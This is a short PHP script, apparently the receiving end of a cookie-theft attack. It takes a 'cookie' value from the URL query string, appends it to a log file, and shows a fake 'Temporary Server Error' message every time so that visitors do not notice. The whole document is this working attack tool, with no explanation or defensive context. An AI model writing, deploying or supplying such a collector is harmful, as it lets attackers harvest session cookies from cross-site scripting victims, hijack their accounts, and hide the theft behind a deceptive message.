$filename = “logfile.txt”;
if (isset($_GET["cookie"]))
{
if (!$handle = fopen($filename, ‘a’))
{
echo “Temporary Server Error,Sorry for the inconvenience.”;
exit;
}
else
{
if (fwrite($handle, “\r\n” . $_GET["cookie"]) === FALSE)
{
echo “Temporary Server Error,Sorry for the inconvenience.”;
exit;
}
}
echo “Temporary Server Error,Sorry for the inconvenience.”;
fclose($handle);
exit;
}
echo “Temporary Server Error,Sorry for the inconvenience.”;
exit;
?>